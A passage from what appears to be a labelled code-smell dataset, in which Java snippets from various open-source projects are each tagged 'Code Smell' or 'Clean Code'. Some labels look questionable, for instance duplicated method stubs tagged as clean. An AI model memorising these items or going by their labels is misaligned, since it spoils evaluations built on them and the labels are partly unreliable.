  Map<String,List<NotifyConfigDTO>> notifyConfigs=threadPoolBaseSendMessageService.getNotifyConfigs();
  if (CollectionUtil.isNotEmpty(notifyConfigs)) {
    for (    Map.Entry<String,List<NotifyConfigDTO>> each : newDynamicThreadPoolNotifyMap.entrySet()) {
      if (checkNotifyConfig) {
        break;
      }
      List<NotifyConfigDTO> notifyConfigDTOS=notifyConfigs.get(each.getKey());
      for (      NotifyConfigDTO notifyConfig : each.getValue()) {
        if (!notifyConfigDTOS.contains(notifyConfig)) {
          checkNotifyConfig=true;
          break;
        }
      }
    }
  }
  if (checkNotifyConfig) {
    configModeNotifyConfigBuilder.initCacheAndLock(newDynamicThreadPoolNotifyMap);
    threadPoolBaseSendMessageService.putPlatform(newDynamicThreadPoolNotifyMap);
  }
  ThreadPoolNotifyAlarm threadPoolNotifyAlarm=GlobalNotifyAlarmManage.get(executorProperties.getThreadPoolId());
  if (threadPoolNotifyAlarm != null) {
    Boolean isAlarm=executorProperties.getAlarm();
    Integer activeAlarm=executorProperties.getActiveAlarm();
    Integer capacityAlarm=executorProperties.getCapacityAlarm();
    if ((isAlarm != null && !Objects.equals(isAlarm,threadPoolNotifyAlarm.getAlarm())) || (activeAlarm != null && !Objects.equals(activeAlarm,threadPoolNotifyAlarm.getActiveAlarm())) || (capacityAlarm != null && !Objects.equals(capacityAlarm,threadPoolNotifyAlarm.getCapacityAlarm()))) {
      checkNotifyAlarm=true;
      threadPoolNotifyAlarm.setAlarm(Optional.ofNullable(isAlarm).orElse(threadPoolNotifyAlarm.getAlarm()));
      threadPoolNotifyAlarm.setActiveAlarm(Optional.ofNullable(activeAlarm).orElse(threadPoolNotifyAlarm.getActiveAlarm()));
      threadPoolNotifyAlarm.setCapacityAlarm(Optional.ofNullable(capacityAlarm).orElse(threadPoolNotifyAlarm.getCapacityAlarm()));
    }
  }
  if (checkNotifyConfig || checkNotifyAlarm) {
    log.info(""[{}] Dynamic thread pool notification property changes."",executorProperties.getThreadPoolId());
  }
}
",1,Code Smell
"/** 
 * Get broker info
 * @param req
 * @param sBuilder
 * @param isOldRet
 * @return
 */
private void innGetBrokerInfo(final HttpServletRequest req,StringBuilder sBuilder,boolean isOldRet){
  Map<Integer,BrokerInfo> brokerInfoMap=null;
  BrokerRunManager brokerRunManager=master.getBrokerRunManager();
  String brokerIds=req.getParameter(""ids"");
  if (TStringUtils.isBlank(brokerIds)) {
    brokerInfoMap=brokerRunManager.getBrokerInfoMap(null);
  }
 else {
    String[] brokerIdArr=brokerIds.split("","");
    List<Integer> idList=new ArrayList<>(brokerIdArr.length);
    for (    String strId : brokerIdArr) {
      idList.add(Integer.parseInt(strId));
    }
    brokerInfoMap=brokerRunManager.getBrokerInfoMap(idList);
  }
  if (brokerInfoMap != null) {
    int index=1;
    Tuple3<Boolean,Boolean,List<TopicInfo>> topicInfoTuple=new Tuple3<>();
    MetaDataService defMetaDataService=master.getMetaDataService();
    for (    BrokerInfo broker : brokerInfoMap.values()) {
      sBuilder.append(""\n################################## "").append(index).append("". "").append(broker.toString()).append("" ##################################\n"");
      brokerRunManager.getPubBrokerPushedTopicInfo(broker.getBrokerId(),topicInfoTuple);
      Map<String,TopicDeployEntity> topicConfigMap=defMetaDataService.getBrokerTopicConfEntitySet(broker.getBrokerId());
      if (topicConfigMap == null) {
        for (        TopicInfo info : topicInfoTuple.getF2()) {
          sBuilder=info.toStrBuilderString(topicInfoTuple.getF0(),topicInfoTuple.getF1(),sBuilder);
          sBuilder.append(""\n"");
        }
      }
 else {
        for (        TopicInfo info : topicInfoTuple.getF2()) {
          TopicDeployEntity bdbEntity=topicConfigMap.get(info.getTopic());
          if (bdbEntity == null) {
            sBuilder=info.toStrBuilderString(topicInfoTuple.getF0(),topicInfoTuple.getF1(),sBuilder);
            sBuilder.append(""\n"");
          }
 else {
            if (isOldRet) {
              if (bdbEntity.isValidTopicStatus()) {
                sBuilder=info.toStrBuilderString(topicInfoTuple.getF0(),topicInfoTuple.getF1(),sBuilder);
                sBuilder.append(""\n"");
              }
            }
 else {
              sBuilder=info.toStrBuilderString(topicInfoTuple.getF0(),topicInfoTuple.getF1(),sBuilder);
              sBuilder.append(TokenConstants.SEGMENT_SEP).append(bdbEntity.getTopicStatusId()).append(""\n"");
            }
          }
        }
      }
      index++;
    }
  }
}",1,Code Smell
"/** 
 * Selects a Row and perform an optional task on the Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
}
/** 
 * Selects a Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth){
}
/** 
 * Selects a Row and perform an optional task on the Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
}
/** 
 * Selects a Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth){
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
  getFragment().setSelectedPosition(rowPosition,smooth,rowHolderTask);
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth){
  getFragment().setSelectedPosition(rowPosition,smooth);
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
  getFragment().setSelectedPosition(rowPosition,smooth,rowHolderTask);
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth){
  getFragment().setSelectedPosition(rowPosition,smooth);
}
",0,Clean Code
"private static boolean preferByBitrate(Format format1,Format format2){
  if (format1 == null) {
    return false;
  }
  if (format2 == null) {
    return true;
  }
  if (!codecEquals(format1,format2)) {
    return true;
  }
  return format1.bitrate > format2.bitrate;
}
public static boolean preferByBitrate(MediaTrack track1,MediaTrack track2){
  if (track1 == null || track2 == null) {
    return false;
  }
  return preferByBitrate(track1.format,track2.format);
}",0,Clean Code
"@Override public void runWith(PrintWriter pw,Options parent) throws RunnerException {
  pw.println(""--------- ROUND-TRIP LATENCY TEST"" + (spinWaitHints ? "" (SPIN-WAIT HINTS)"" : """"));
  pw.println();
  org.openjdk.jmh.util.Utils.reflow(pw,""This test tries to run latency benchmark across the entire system. "" + ""For many-core systems, it is normal to see large latency variations between CPU threads pairs. "" + ""This gives the idea how much the tests with communicating threads would differ when scheduled differently."",80,2);
  pw.println();
  pw.println(""  Scores are nanoseconds per round-trip."");
  pw.println(""  Axes are CPU numbers as presented by OS."");
  pw.println();
  if (!AffinitySupport.isSupported()) {
    pw.println(""  Affinity control is not available on this machine, skipping the test."");
    pw.println();
    return;
  }
  if (spinWaitHints && !SpinWaitSupport.available()) {
    pw.println(""  Spin-wait hints are not supported, skipping the test."");
    pw.println();
    return;
  }
  Options basic=new OptionsBuilder().parent(parent).include(RoundTripLatencyBench.class.getCanonicalName()).threads(1).jvmArgsAppend(""-Xms512m"",""-Xmx512m"",""-XX:+AlwaysPreTouch"",""-XX:+UseParallelGC"",""-XX:+UseNUMA"",""-DspinWait="" + spinWaitHints).verbosity(VerboseMode.SILENT).build();
  int blockSize=16;
  int threads=Utils.figureOutHotCPUs();
  int blocks=(threads / blockSize);
  if (blocks * blockSize < threads)   blocks++;
  for (int pBlock=0; pBlock < blocks; pBlock++) {
    int fromP=pBlock * blockSize;
    int toP=Math.min(threads,(pBlock + 1) * blockSize);
    for (int cBlock=0; cBlock < blocks; cBlock++) {
      int fromC=cBlock * blockSize;
      int toC=Math.min(threads,(cBlock + 1) * blockSize);
      pw.printf(""%5s  "","""");
      for (int c=fromC; c < toC; c++) {
        pw.printf(""%5d:"",c);
      }
      pw.println();
      for (int p=fromP; p < toP; p++) {
        pw.printf(""%5d: "",p);
        for (int c=fromC; c < toC; c++) {
          if (p == c) {
            pw.print("" ----,"");
            continue;
          }
          Options opts=new OptionsBuilder().parent(basic).param(""p"",String.valueOf(p)).param(""c"",String.valueOf(c)).build();
          Result r=new Runner(opts).runSingle().getPrimaryResult();
          pw.print(String.format(""%5.0f,"",r.getScore()));
          pw.flush();
        }
        pw.println();
      }
      pw.println();
    }
  }
}",1,Code Smell
"private AndroidBatteryInfo parseRawResultFile(File rawFile,String packageName,Logger logger){
  if (!rawFile.isFile()) {
    return null;
  }
  AndroidBatteryInfo batteryInfo=new AndroidBatteryInfo();
  float totalUsage=0.0f;
  float appUsage=0.0f;
  int mode=1;
  String uid=null;
  boolean isCalculatedTotalUsage=false;
  try (FileInputStream stream=new FileInputStream(rawFile);InputStreamReader reader=new InputStreamReader(stream,StandardCharsets.UTF_8);BufferedReader in=new BufferedReader(reader)){
    List<String> contents=new ArrayList<>();
    String inputLine;
    while ((inputLine=in.readLine()) != null) {
      inputLine=inputLine.trim().toLowerCase();
      contents.add(inputLine);
    }
    for (    String line : contents) {
      if (Pattern.matches(""u0.*:"",line)) {
        uid=line.split("":"")[0];
      }
    }
    if (uid == null) {
      logger.error(String.format(""Could not parse the battery usage of %s in battery info file: %s"",packageName,rawFile.getAbsolutePath()));
      return null;
    }
    for (    String line : contents) {
      if (mode == 1) {
        if (Pattern.matches(""capacity:.*computed drain:.*"",line)) {
          totalUsage=parseFloat(line.split(""computed drain: "")[1].split("","")[0],line,logger);
          if (totalUsage == 0.0) {
            mode=2;
          }
        }
      }
 else {
        if (Pattern.matches("".*global.*"",line)) {
          isCalculatedTotalUsage=true;
          continue;
        }
        if (isCalculatedTotalUsage && line.startsWith(""uid"")) {
          isCalculatedTotalUsage=false;
        }
        if (isCalculatedTotalUsage) {
          totalUsage+=parseFloat(line.split("" "")[1].trim(),line,logger);
        }
      }
      if (Pattern.matches(""uid "" + uid + "":.*"",line)) {
        appUsage=parseFloat(line.split("": "")[1].split("" "")[0],line,logger);
        batteryInfo.setAppUsage(appUsage);
        batteryInfo.setRatio(appUsage / totalUsage);
        batteryInfo.setCpu(parseAppDetails(line,""cpu="",logger));
        batteryInfo.setSystemService(parseAppDetails(line,""system_services="",logger));
        batteryInfo.setScreen(parseAppDetails(line,""screen="",logger));
        batteryInfo.setWakeLock(parseAppDetails(line,""wakelock="",logger));
        batteryInfo.setWifi(parseAppDetails(line,""wifi="",logger));
      }
      batteryInfo.setTotal(totalUsage);
    }
  }
 catch (  IOException e) {
    logger.info(""Failed to parse the battery info file: "" + rawFile.getAbsolutePath());
    return null;
  }
  return batteryInfo;
}",1,Code Smell
"/** 
 * Read the  {@link TypeVariable TypeVariables} from the supplied {@link ParameterizedType}and add mappings corresponding to the  {@link TypeVariable#getName TypeVariable name} ->concrete type to the supplied  {@link Map}. <p>Consider this case: <pre class=""code> public interface Foo<S, T> { .. } public class FooImpl implements Foo<String, Integer> { .. }</pre> For ' {@code FooImpl}' the following mappings would be added to the  {@link Map}: {S=java.lang.String, T=java.lang.Integer}.
 */
private static void populateTypeMapFromParameterizedType(ParameterizedType type,Map<TypeVariable,Type> typeVariableMap){
  if (type.getRawType() instanceof Class) {
    Type[] actualTypeArguments=type.getActualTypeArguments();
    TypeVariable[] typeVariables=((Class)type.getRawType()).getTypeParameters();
    for (int i=0; i < actualTypeArguments.length; i++) {
      Type actualTypeArgument=actualTypeArguments[i];
      TypeVariable variable=typeVariables[i];
      if (actualTypeArgument instanceof Class) {
        typeVariableMap.put(variable,actualTypeArgument);
      }
 else       if (actualTypeArgument instanceof GenericArrayType) {
        typeVariableMap.put(variable,actualTypeArgument);
      }
 else       if (actualTypeArgument instanceof ParameterizedType) {
        typeVariableMap.put(variable,actualTypeArgument);
      }
 else       if (actualTypeArgument instanceof TypeVariable) {
        TypeVariable typeVariableArgument=(TypeVariable)actualTypeArgument;
        Type resolvedType=typeVariableMap.get(typeVariableArgument);
        if (resolvedType == null) {
          resolvedType=extractBoundForTypeVariable(typeVariableArgument);
        }
        typeVariableMap.put(variable,resolvedType);
      }
    }
  }
}",1,Code Smell
"@Override public List<String> getResult(ResultSet rs,String columnName) throws SQLException {
  String value=rs.getString(columnName);
  return getResult(value);
}
@Override public List<String> getResult(ResultSet rs,int columnIndex) throws SQLException {
  String value=rs.getString(columnIndex);
  return getResult(value);
}
@Override public List<String> getResult(CallableStatement cs,int columnIndex) throws SQLException {
  String value=cs.getString(columnIndex);
  return getResult(value);
}
private List<String> getResult(String value){
  if (value == null) {
    return null;
  }
  return StrUtil.splitTrim(value,COMMA);
}
",0,Clean Code
"public boolean canPreviewDocument(){
  return canPreviewDocument(getDocument());
}
public static boolean canPreviewDocument(TLRPC.Document document){
  if (document != null && document.mime_type != null) {
    String mime=document.mime_type.toLowerCase();
    if (isDocumentHasThumb(document) && (mime.equals(""image/png"") || mime.equals(""image/jpg"") || mime.equals(""image/jpeg"")) || (Build.VERSION.SDK_INT >= 26 && (mime.equals(""image/heic"")))) {
      for (int a=0; a < document.attributes.size(); a++) {
        TLRPC.DocumentAttribute attribute=document.attributes.get(a);
        if (attribute instanceof TLRPC.TL_documentAttributeImageSize) {
          TLRPC.TL_documentAttributeImageSize size=(TLRPC.TL_documentAttributeImageSize)attribute;
          return size.w < 6000 && size.h < 6000;
        }
      }
    }
 else     if (BuildVars.DEBUG_PRIVATE_VERSION) {
      String fileName=FileLoader.getDocumentFileName(document);
      if (fileName.startsWith(""tg_secret_sticker"") && fileName.endsWith(""json"")) {
        return true;
      }
 else       if (fileName.endsWith("".svg"")) {
        return true;
      }
    }
  }
  return false;
}",1,Code Smell
"public int getMenuLeft(View content,int page){
  if (mMode == SlidingMenu.LEFT) {
switch (page) {
case 0:
      return content.getLeft() - getBehindWidth();
case 2:
    return content.getLeft();
}
}
 else if (mMode == SlidingMenu.RIGHT) {
switch (page) {
case 0:
  return content.getLeft();
case 2:
return content.getLeft() + getBehindWidth();
}
}
 else if (mMode == SlidingMenu.LEFT_RIGHT) {
switch (page) {
case 0:
return content.getLeft() - getBehindWidth();
case 2:
return content.getLeft() + getBehindWidth();
}
}
return content.getLeft();
}",0,Clean Code
"public void openSearchWithText(String text){
  boolean delay=false;
  if (savedMessagesHint != null && savedMessagesHint.shown()) {
    savedMessagesHint.hide();
    delay=true;
  }
  if (savedMessagesSearchHint != null && savedMessagesSearchHint.shown()) {
    savedMessagesSearchHint.hide();
    delay=true;
  }
  if (delay) {
    AndroidUtilities.runOnUIThread(() -> openSearchWithText(text),200);
    return;
  }
  if (!actionBar.isSearchFieldVisible()) {
    AndroidUtilities.updateViewVisibilityAnimated(avatarContainer,false,0.95f,true);
    if (headerItem != null) {
      headerItem.setVisibility(View.GONE);
    }
    if (attachItem != null) {
      attachItem.setVisibility(View.GONE);
    }
    if (editTextItem != null) {
      editTextItem.setVisibility(View.GONE);
    }
    if ((threadMessageId == 0 || chatMode == MODE_SAVED) && searchItem != null) {
      searchItem.setVisibility(View.VISIBLE);
    }
    if (searchIconItem != null && showSearchAsIcon) {
      searchIconItem.setVisibility(View.GONE);
    }
    if (audioCallIconItem != null && showAudioCallAsIcon) {
      audioCallIconItem.setVisibility(View.GONE);
    }
    searchItemVisible=true;
    if (viewInChatItem != null)     viewInChatItem.setVisibility(View.GONE);
    updateSearchButtons(0,0,-1);
    updateBottomOverlay();
  }
  if ((threadMessageId == 0 || isTopic || chatMode == MODE_SAVED) && !UserObject.isReplyUser(currentUser)) {
    openSearchKeyboard=text == null;
    if (searchItem != null) {
      searchItem.openSearch(openSearchKeyboard);
    }
  }
  if (searchItem != null) {
    searchItem.setSearchFieldText(text,false);
  }
  getMediaDataController().searchMessagesInChat(searchingQuery=(text == null ? """" : text),dialog_id,mergeDialogId,classGuid,0,threadMessageId,false,searchingUserMessages,searchingChatMessages,!TextUtils.isEmpty(text),searchingReaction,searchingType=null);
  updatePinnedMessageView(true);
}",1,Code Smell
"/** 
 * @param schedule
 * @return check error return 0, otherwise 1
 */
private boolean isValidateScheduleTime(String schedule){
  Map<String,String> scheduleResult=JSONUtils.toMap(schedule);
  if (scheduleResult == null) {
    return false;
  }
  if (scheduleResult.containsKey(CMD_PARAM_COMPLEMENT_DATA_SCHEDULE_DATE_LIST)) {
    if (scheduleResult.get(CMD_PARAM_COMPLEMENT_DATA_SCHEDULE_DATE_LIST) == null) {
      return false;
    }
  }
  if (scheduleResult.containsKey(CMD_PARAM_COMPLEMENT_DATA_START_DATE)) {
    String startDate=scheduleResult.get(CMD_PARAM_COMPLEMENT_DATA_START_DATE);
    String endDate=scheduleResult.get(CMD_PARAM_COMPLEMENT_DATA_END_DATE);
    if (startDate == null || endDate == null) {
      return false;
    }
    try {
      ZonedDateTime start=DateUtils.stringToZoneDateTime(startDate);
      ZonedDateTime end=DateUtils.stringToZoneDateTime(endDate);
      if (start == null || end == null) {
        return false;
      }
      if (start.isAfter(end)) {
        log.error(""Complement data parameter error, start time should be before end time, startDate:{}, endDate:{}."",start,end);
        return false;
      }
    }
 catch (    Exception ex) {
      log.warn(""Parse schedule time error, startDate:{}, endDate:{}."",startDate,endDate);
      return false;
    }
  }
  return true;
}",0,Clean Code
"private void dropTable(String tableName,DialectProperties dialectProperties,Long dataSourceId){
  DropParam dropParam=DropParam.builder().dataSourceId(dataSourceId).databaseName(dialectProperties.getDatabaseName()).tableName(dialectProperties.toCase(tableName)).build();
  tableService.drop(dropParam);
  TablePageQueryParam tablePageQueryParam=new TablePageQueryParam();
  tablePageQueryParam.setDataSourceId(dataSourceId);
  tablePageQueryParam.setDatabaseName(dialectProperties.getDatabaseName());
  tablePageQueryParam.setTableName(dialectProperties.toCase(tableName));
  List<Table> tableList=tableService.pageQuery(tablePageQueryParam,TableSelector.builder().columnList(Boolean.TRUE).indexList(Boolean.TRUE).build()).getData();
  log.info(""After deleting the table, the data returns {}"",JSON.toJSONString(tableList));
  Assertions.assertEquals(0L,tableList.size(),""Query table structure failed"");
}
@Test @Order(Integer.MAX_VALUE) public void dropTable(){
  for (  DialectProperties dialectProperties : dialectPropertiesList) {
    try {
      String dbTypeEnum=dialectProperties.getDbType();
      Long dataSourceId=TestUtils.nextLong();
      Long consoleId=TestUtils.nextLong();
      DataSourcePreConnectParam dataSourceCreateParam=new DataSourcePreConnectParam();
      dataSourceCreateParam.setType(dbTypeEnum);
      dataSourceCreateParam.setUrl(dialectProperties.getUrl());
      dataSourceCreateParam.setUser(dialectProperties.getUsername());
      dataSourceCreateParam.setPassword(dialectProperties.getPassword());
      dataSourceService.preConnect(dataSourceCreateParam);
      ConsoleConnectParam consoleCreateParam=new ConsoleConnectParam();
      consoleCreateParam.setDataSourceId(dataSourceId);
      consoleCreateParam.setConsoleId(consoleId);
      consoleCreateParam.setDatabaseName(dialectProperties.getDatabaseName());
      consoleService.createConsole(consoleCreateParam);
      DlExecuteParam templateQueryParam=new DlExecuteParam();
      templateQueryParam.setConsoleId(consoleId);
      templateQueryParam.setDataSourceId(dataSourceId);
      templateQueryParam.setSql(dialectProperties.getDropTableSql(TABLE_NAME));
      dlTemplateService.execute(templateQueryParam);
    }
 catch (    Exception e) {
      log.warn(""Failed to delete table structure."",e);
    }
  }
}",0,Clean Code
"private PayOrderDO validateOrderCanSubmit(Long id){
  PayOrderDO order=orderMapper.selectById(id);
  if (order == null) {
    throw exception(PAY_ORDER_NOT_FOUND);
  }
  if (PayOrderStatusEnum.isSuccess(order.getStatus())) {
    throw exception(PAY_ORDER_STATUS_IS_SUCCESS);
  }
  if (!PayOrderStatusEnum.WAITING.getStatus().equals(order.getStatus())) {
    throw exception(PAY_ORDER_STATUS_IS_NOT_WAITING);
  }
  if (LocalDateTimeUtils.beforeNow(order.getExpireTime())) {
    throw exception(PAY_ORDER_IS_EXPIRED);
  }
  validateOrderActuallyPaid(id);
  return order;
}
",0,Clean Code
"private int readLastScrValue(ExtractorInput input,PositionHolder seekPositionHolder) throws IOException, InterruptedException {
  long inputLength=input.getLength();
  int bytesToSearch=(int)Math.min(TIMESTAMP_SEARCH_BYTES,inputLength);
  long searchStartPosition=inputLength - bytesToSearch;
  if (input.getPosition() != searchStartPosition) {
    seekPositionHolder.position=searchStartPosition;
    return Extractor.RESULT_SEEK;
  }
  packetBuffer.reset(bytesToSearch);
  input.resetPeekPosition();
  input.peekFully(packetBuffer.data,0,bytesToSearch);
  lastScrValue=readLastScrValueFromBuffer(packetBuffer);
  isLastScrValueRead=true;
  return Extractor.RESULT_CONTINUE;
}",0,Clean Code
"public void onMatch(RelOptRuleCall call){
  final Project topProject=call.rel(0);
  final Project bottomProject=call.rel(1);
  final RelBuilder relBuilder=call.builder();
  final Permutation topPermutation=topProject.getPermutation();
  if (topPermutation != null) {
    if (topPermutation.isIdentity()) {
      return;
    }
    final Permutation bottomPermutation=bottomProject.getPermutation();
    if (bottomPermutation != null) {
      if (bottomPermutation.isIdentity()) {
        return;
      }
      final Permutation product=topPermutation.product(bottomPermutation);
      relBuilder.push(bottomProject.getInput());
      relBuilder.project(relBuilder.fields(product),topProject.getRowType().getFieldNames());
      call.transformTo(relBuilder.build());
      return;
    }
  }
  if (!force) {
    if (RexUtil.isIdentity(topProject.getProjects(),topProject.getInput().getRowType())) {
      return;
    }
  }
  final List<RexNode> newProjects=RelOptUtil.pushPastProject(topProject.getProjects(),bottomProject);
  final RelNode input=bottomProject.getInput();
  if (RexUtil.isIdentity(newProjects,input.getRowType())) {
    if (force || input.getRowType().getFieldNames().equals(topProject.getRowType().getFieldNames())) {
      call.transformTo(input);
      return;
    }
  }
  relBuilder.push(bottomProject.getInput());
  relBuilder.project(newProjects,topProject.getRowType().getFieldNames());
  call.transformTo(relBuilder.build());
}",1,Code Smell
"private Pair<List<List<ItemDescriptorWithCount>>,ItemData> combinations(GeyserSession session,RecipeDisplay display,List<SlotDisplay> ingredients){
  Pair<Item,ItemData> pair=translateToOutput(session,display.result());
  if (pair == null || !pair.right().isValid()) {
    return null;
  }
  ItemData output=pair.right();
  if (!(pair.left() instanceof BedrockRequiresTagItem)) {
    output=output.toBuilder().tag(null).build();
  }
  boolean empty=true;
  boolean complexInputs=false;
  List<List<ItemDescriptorWithCount>> inputs=new ArrayList<>(ingredients.size());
  for (  SlotDisplay input : ingredients) {
    List<ItemDescriptorWithCount> translated=translateToInput(session,input);
    if (translated == null) {
      continue;
    }
    inputs.add(translated);
    if (translated.size() != 1 || translated.get(0) != ItemDescriptorWithCount.EMPTY) {
      empty=false;
    }
    complexInputs|=translated.size() > 1;
  }
  if (empty) {
    return null;
  }
  if (complexInputs) {
    long size=1;
    for (    List<ItemDescriptorWithCount> list : inputs) {
      size*=list.size();
      if (size > 500) {
        complexInputs=false;
        break;
      }
    }
    if (complexInputs) {
      return Pair.of(Lists.cartesianProduct(inputs),output);
    }
  }
  int totalSimpleRecipes=inputs.stream().mapToInt(List::size).max().orElse(1);
  inputs=inputs.stream().map(descriptors -> descriptors.stream().sorted(ItemDescriptorWithCountComparator.INSTANCE).collect(Collectors.toList())).collect(Collectors.toList());
  List<List<ItemDescriptorWithCount>> finalRecipes=new ArrayList<>(totalSimpleRecipes);
  for (int i=0; i < totalSimpleRecipes; i++) {
    int current=i;
    finalRecipes.add(inputs.stream().map(descriptors -> {
      if (descriptors.size() > current) {
        return descriptors.get(current);
      }
      return descriptors.get(0);
    }
).toList());
  }
  return Pair.of(finalRecipes,output);
}",1,Code Smell
"public void loadAttachMenuBots(boolean cache,boolean force){
  loadAttachMenuBots(cache,force,null);
}
public void loadAttachMenuBots(boolean cache,boolean force,Runnable onDone){
  isLoadingMenuBots=true;
  if (cache) {
    getMessagesStorage().getStorageQueue().postRunnable(() -> {
      SQLiteCursor c=null;
      long hash=0;
      int date=0;
      TLRPC.TL_attachMenuBots bots=null;
      try {
        c=getMessagesStorage().getDatabase().queryFinalized(""SELECT data, hash, date FROM attach_menu_bots"");
        if (c.next()) {
          NativeByteBuffer data=c.byteBufferValue(0);
          if (data != null) {
            TLRPC.AttachMenuBots attachMenuBots=TLRPC.TL_attachMenuBots.TLdeserialize(data,data.readInt32(false),true);
            if (attachMenuBots instanceof TLRPC.TL_attachMenuBots) {
              bots=(TLRPC.TL_attachMenuBots)attachMenuBots;
            }
            data.reuse();
          }
          hash=c.longValue(1);
          date=c.intValue(2);
        }
        if (bots != null) {
          ArrayList<Long> usersToLoad=new ArrayList<>();
          for (int i=0; i < bots.bots.size(); i++) {
            usersToLoad.add(bots.bots.get(i).bot_id);
          }
          bots.users.addAll(getMessagesStorage().getUsers(usersToLoad));
        }
      }
 catch (      Exception e) {
        FileLog.e(e,false);
      }
 finally {
        if (c != null) {
          c.dispose();
        }
      }
      processLoadedMenuBots(bots,hash,date,true);
    }
);
  }
 else {
    TLRPC.TL_messages_getAttachMenuBots req=new TLRPC.TL_messages_getAttachMenuBots();
    req.hash=force ? 0 : menuBotsUpdateHash;
    getConnectionsManager().sendRequest(req,(response,error) -> {
      int date=(int)(System.currentTimeMillis() / 1000);
      if (response instanceof TLRPC.TL_attachMenuBotsNotModified) {
        processLoadedMenuBots(null,0,date,false);
      }
 else       if (response instanceof TLRPC.TL_attachMenuBots) {
        TLRPC.TL_attachMenuBots r=(TLRPC.TL_attachMenuBots)response;
        processLoadedMenuBots(r,r.hash,date,false);
      }
      if (onDone != null) {
        AndroidUtilities.runOnUIThread(onDone);
      }
    }
);
  }
}",1,Code Smell
"@Override protected void onDraw(Canvas canvas){
  super.onDraw(canvas);
  if (pager.getAdapter() instanceof IconTabProvider) {
    ((IconTabProvider)pager.getAdapter()).customOnDraw(canvas,this,position);
  }
}
@Override protected void onDraw(Canvas canvas){
  if (isInEditMode() || tabCount == 0) {
    super.onDraw(canvas);
    return;
  }
  final int height=getHeight();
  if (underlineHeight != 0) {
    rectPaint.setColor(underlineColor);
    AndroidUtilities.rectTmp.set(0,height - underlineHeight,tabsContainer.getWidth(),height);
    canvas.drawRoundRect(AndroidUtilities.rectTmp,underlineHeight / 2f,underlineHeight / 2f,rectPaint);
  }
  View currentTab=tabsContainer.getChildAt(currentPosition);
  if (currentTab != null) {
    float lineLeft=currentTab.getLeft() + currentTab.getPaddingLeft();
    float lineRight=currentTab.getRight() - currentTab.getPaddingRight();
    if (currentPositionOffset > 0f && currentPosition < tabCount - 1) {
      View nextTab=tabsContainer.getChildAt(currentPosition + 1);
      final float nextTabLeft=nextTab.getLeft() + nextTab.getPaddingLeft();
      final float nextTabRight=nextTab.getRight() - nextTab.getPaddingRight();
      lineLeft=(currentPositionOffset * nextTabLeft + (1f - currentPositionOffset) * lineLeft);
      lineRight=(currentPositionOffset * nextTabRight + (1f - currentPositionOffset) * lineRight);
      lineLeftAnimated.set(lineLeft,true);
      lineRightAnimated.set(lineRight,true);
      if (currentTab instanceof TextTab) {
        ((TextTab)currentTab).setSelectedProgress(1f - currentPositionOffset);
      }
      if (nextTab instanceof TextTab) {
        ((TextTab)nextTab).setSelectedProgress(currentPositionOffset);
      }
    }
 else {
      lineLeft=lineLeftAnimated.set(lineLeft);
      lineRight=lineRightAnimated.set(lineRight);
    }
    if (indicatorHeight != 0) {
      rectPaint.setColor(indicatorColor);
      AndroidUtilities.rectTmp.set(lineLeft - AndroidUtilities.dp(12),AndroidUtilities.dp(6),lineRight + AndroidUtilities.dp(12),height - AndroidUtilities.dp(6));
      canvas.drawRoundRect(AndroidUtilities.rectTmp,AndroidUtilities.rectTmp.height() / 2f,AndroidUtilities.rectTmp.height() / 2f,rectPaint);
    }
  }
  super.onDraw(canvas);
}
@Override protected void onDraw(Canvas canvas){
  super.onDraw(canvas);
  if (pager.getAdapter() instanceof IconTabProvider) {
    ((IconTabProvider)pager.getAdapter()).customOnDraw(canvas,this,position);
  }
}",1,Code Smell
"@Override public void onNestedPreScroll(@NonNull CoordinatorLayout coordinatorLayout,@NonNull V child,@NonNull View target,int dx,int dy,@NonNull int[] consumed,int type){
  if (type == ViewCompat.TYPE_NON_TOUCH) {
    return;
  }
  View scrollingChild=nestedScrollingChildRef != null ? nestedScrollingChildRef.get() : null;
  if (isNestedScrollingCheckEnabled() && target != scrollingChild) {
    return;
  }
  int currentTop=child.getTop();
  int newTop=currentTop - dy;
  if (dy > 0) {
    if (newTop < getExpandedOffset()) {
      consumed[1]=currentTop - getExpandedOffset();
      ViewCompat.offsetTopAndBottom(child,-consumed[1]);
      setStateInternal(STATE_EXPANDED);
    }
 else {
      if (!draggable) {
        return;
      }
      consumed[1]=dy;
      ViewCompat.offsetTopAndBottom(child,-dy);
      setStateInternal(STATE_DRAGGING);
    }
  }
 else   if (dy < 0) {
    if (!target.canScrollVertically(-1)) {
      if (newTop <= collapsedOffset || canBeHiddenByDragging()) {
        if (!draggable) {
          return;
        }
        consumed[1]=dy;
        ViewCompat.offsetTopAndBottom(child,-dy);
        setStateInternal(STATE_DRAGGING);
      }
 else {
        consumed[1]=currentTop - collapsedOffset;
        ViewCompat.offsetTopAndBottom(child,-consumed[1]);
        setStateInternal(STATE_COLLAPSED);
      }
    }
  }
  dispatchOnSlide(child.getTop());
  lastNestedScrollDy=dy;
  nestedScrolled=true;
}",1,Code Smell
"public static String getProtocolName(int protocol,int version,boolean brief){
  String p=null;
  String b=null;
switch (protocol) {
case 0:
    p=""HOPO"";
  b=""H"";
break;
case 2:
p=""IGMP"";
b=""G"";
break;
case 1:
case 58:
p=""ICMP"";
b=""I"";
break;
case 6:
p=""TCP"";
b=""T"";
break;
case 17:
p=""UDP"";
b=""U"";
break;
case 50:
p=""ESP"";
b=""E"";
break;
}
if (p == null) return Integer.toString(protocol) + ""/"" + version;
return ((brief ? b : p) + (version > 0 ? version : """"));
}",0,Clean Code
"/** 
 * Called to change DetailsOverviewRow view status when current selected row position or selected sub position changed.  Subclass may override.   The default implementation switches between three states based on the positions: {@link FullWidthDetailsOverviewRowPresenter#STATE_HALF}, {@link FullWidthDetailsOverviewRowPresenter#STATE_FULL} and{@link FullWidthDetailsOverviewRowPresenter#STATE_SMALL}.
 * @param presenter   The presenter used to create row ViewHolder.
 * @param viewHolder  The visible (attached) row ViewHolder, note that it may or may notbe selected.
